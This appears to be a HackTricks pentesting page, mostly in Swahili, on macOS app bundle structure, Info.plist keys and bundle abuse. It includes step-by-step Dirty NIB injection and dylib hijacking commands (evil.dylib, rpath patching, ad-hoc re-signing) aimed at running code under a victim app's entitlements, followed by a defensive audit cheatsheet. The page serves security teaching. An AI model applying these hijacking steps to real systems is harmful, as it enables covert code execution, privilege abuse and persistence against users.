# Bundles za macOS

{{#include ../../../banners/hacktricks-training.md}}

## Taarifa za Msingi

Bundles katika macOS hutumika kama kontena za rasilimali mbalimbali, zikiwemo applications, libraries, na mafaili mengine muhimu, na kuzifanya zionekane kama objects moja katika Finder, kama mafaili yanayojulikana ya `*.app`. Bundle inayopatikana mara nyingi ni `.app`, ingawa aina nyingine kama `.framework`, `.systemextension`, na `.kext` pia hutumika sana.

### Vipengele Muhimu vya Bundle

Ndani ya bundle, hasa katika directory ya `<application>.app/Contents/`, kuna rasilimali mbalimbali muhimu:

- **\_CodeSignature**: Directory hii huhifadhi maelezo ya code-signing muhimu kwa ajili ya kuthibitisha uadilifu wa application. Unaweza kukagua taarifa za code-signing kwa kutumia commands kama:
```bash
openssl dgst -binary -sha1 /Applications/Safari.app/Contents/Resources/Assets.car | openssl base64
```
- **MacOS**: Ina binary ya executable ya application inayotekelezwa mtumiaji anapoingiliana nayo.
- **Resources**: Hifadhi ya vipengele vya user interface ya application, ikijumuisha picha, nyaraka, na maelezo ya interface (faili za nib/xib).
- **Info.plist**: Hufanya kazi kama faili kuu ya configuration ya application, na ni muhimu kwa mfumo kuitambua na kuingiliana nayo ipasavyo.

#### Keys Muhimu katika Info.plist

Faili ya `Info.plist` ni msingi wa configuration ya application, ikiwa na keys kama:

- **CFBundleExecutable**: Hubainisha jina la faili kuu ya executable iliyo katika directory ya `Contents/MacOS`.
- **CFBundleIdentifier**: Hutoa identifier ya kimataifa ya application, inayotumiwa sana na macOS kwa ajili ya usimamizi wa application.
- **LSMinimumSystemVersion**: Huonyesha version ya chini kabisa ya macOS inayohitajika ili application ifanye kazi.

### Kuchunguza Bundles

Ili kuchunguza yaliyomo kwenye bundle, kama vile `Safari.app`, command ifuatayo inaweza kutumika: `bash ls -lR /Applications/Safari.app/Contents`

Uchunguzi huu huonyesha directories kama `_CodeSignature`, `MacOS`, `Resources`, na faili kama `Info.plist`, ambapo kila moja ina jukumu la kipekee, kuanzia kulinda application hadi kufafanua user interface na operational parameters zake.

#### Directories za Ziada za Bundle

Mbali na directories za kawaida, bundles zinaweza pia kuwa na:

- **Frameworks**: Ina frameworks zilizowekwa pamoja na application. Frameworks zinafanana na dylibs zenye resources za ziada.
- **PlugIns**: Directory ya plug-ins na extensions zinazoongeza capabilities za application.
- **XPCServices**: Ina XPC services zinazotumiwa na application kwa mawasiliano ya out-of-process.

Muundo huu huhakikisha kuwa components zote zinazohitajika zimefungwa ndani ya bundle, hivyo kuwezesha mazingira ya application yaliyo modular na salama.

Kwa maelezo zaidi kuhusu keys za `Info.plist` na maana zake, documentation ya Apple developer ina resources pana: [Apple Info.plist Key Reference](https://developer.apple.com/library/archive/documentation/General/Reference/InfoPlistKeyReference/Introduction/Introduction.html).

## Security Notes & Abuse Vectors

- **Gatekeeper / App Translocation**: Bundle iliyowekwa quarantine inapotekelezwa kwa mara ya kwanza, macOS hufanya deep signature verification na inaweza kuiendesha kutoka kwenye randomized translocated path. Baada ya kukubaliwa, launches zinazofuata hufanya shallow checks pekee; resource files katika `Resources/`, `PlugIns/`, nibs, n.k., kihistoria hazikukaguliwa. Tangu macOS 13 Ventura, deep check hutekelezwa wakati wa first run, na permission mpya ya *App Management* ya TCC huwazuia third-party processes kurekebisha bundles nyingine bila ridhaa ya mtumiaji, lakini systems za zamani bado ziko vulnerable.
- **Bundle Identifier collisions**: Embedded targets nyingi (PlugIns, helper tools) zinapotumia tena `CFBundleIdentifier` ileile, zinaweza kuharibu signature validation na wakati mwingine kuwezesha URL-scheme hijacking/confusion. Kila mara enumerate sub-bundles na uthibitishe IDs za kipekee.

## Resource Hijacking (Dirty NIB / NIB Injection)

Kabla ya Ventura, kubadilisha UI resources katika signed app kuliruhusu kupita shallow code signing na kupata code execution yenye entitlements za application. Utafiti wa sasa (2024) unaonyesha kuwa hii bado inafanya kazi kwenye pre-Ventura na builds ambazo hazijawekwa quarantine:<sup>[[1]](#references)[[2]](#references)</sup>

1. Copy target app hadi location inayoweza kuandikwa (kwa mfano, `/tmp/Victim.app`).
2. Replace `Contents/Resources/MainMenu.nib` (au nib yoyote iliyotajwa katika `NSMainNibFile`) kwa malicious one inayoinstantiate `NSAppleScript`, `NSTask`, n.k.
3. Launch app. Malicious nib hutekelezwa chini ya bundle ID na entitlements za victim (TCC grants, microphone/camera, n.k.).
4. Ventura+ hupunguza hatari hii kwa kufanya deep-verifying ya bundle wakati wa first launch na kuhitaji permission ya *App Management* kwa modifications zinazofuata, hivyo persistence inakuwa ngumu zaidi, lakini initial-launch attacks kwenye macOS za zamani bado zinatumika.<sup>[[1]](#references)</sup>

Mfano wa minimal malicious nib payload (compile xib kuwa nib kwa kutumia `ibtool`):
```bash
# create a nib that runs osascript -e 'do shell script "id"'
# ...build xib in Xcode, then
ibtool --compile MainMenu.nib MainMenu.xib
cp MainMenu.nib /tmp/Victim.app/Contents/Resources/
open /tmp/Victim.app
```
## Framework / PlugIn / dylib Hijacking inside Bundles

Kwa sababu utafutaji wa `@rpath` hupendelea Frameworks/PlugIns zilizo ndani ya bundle, kuweka library hasidi ndani ya `Contents/Frameworks/` au `Contents/PlugIns/` kunaweza kuelekeza upya mpangilio wa upakiaji wakati binary kuu imesainiwa bila library validation au ikiwa na mpangilio dhaifu wa `LC_RPATH`.

Hatua za kawaida wakati wa kutumia vibaya bundle isiyosainiwa/ad-hoc:
```bash
cp evil.dylib /tmp/Victim.app/Contents/Frameworks/
install_name_tool -add_rpath @executable_path/../Frameworks /tmp/Victim.app/Contents/MacOS/Victim
# or patch an existing load command
install_name_tool -change @rpath/Legit.dylib @rpath/evil.dylib /tmp/Victim.app/Contents/MacOS/Victim
codesign -f -s - --timestamp=none /tmp/Victim.app/Contents/Frameworks/evil.dylib
codesign -f -s - --deep --timestamp=none /tmp/Victim.app
open /tmp/Victim.app
```
Notes:
- Hardened runtime yenye `com.apple.security.cs.disable-library-validation` ambayo haipo huzuia third-party dylibs; angalia entitlements kwanza.
- XPC services zilizo chini ya `Contents/XPCServices/` mara nyingi hupakia sibling frameworks—patch binaries zao vivyo hivyo kwa persistence au njia za privilege escalation.

## Cheatsheet ya Ukaguzi wa Haraka
```bash
# list top-level bundle metadata
/usr/libexec/PlistBuddy -c "Print :CFBundleIdentifier" /Applications/App.app/Contents/Info.plist

# enumerate embedded bundles
find /Applications/App.app/Contents -name "*.app" -o -name "*.framework" -o -name "*.plugin" -o -name "*.xpc"

# verify code signature depth
codesign --verify --deep --strict /Applications/App.app && echo OK

# show rpaths and linked libs
otool -l /Applications/App.app/Contents/MacOS/App | grep -A2 RPATH
otool -L /Applications/App.app/Contents/MacOS/App
```
## Marejeleo

- [1] [Bringing process injection into view(s): exploiting macOS apps using nib files (2024)](https://sector7.computest.nl/post/2024-04-bringing-process-injection-into-view-exploiting-all-macos-apps-using-nib-files/)
- [2] [Dirty NIB & bundle resource tampering write-up (2024)](https://karol-mazurek.medium.com/snake-apple-app-bundle-ext-f5c43a3c84c4)

{{#include ../../../banners/hacktricks-training.md}}
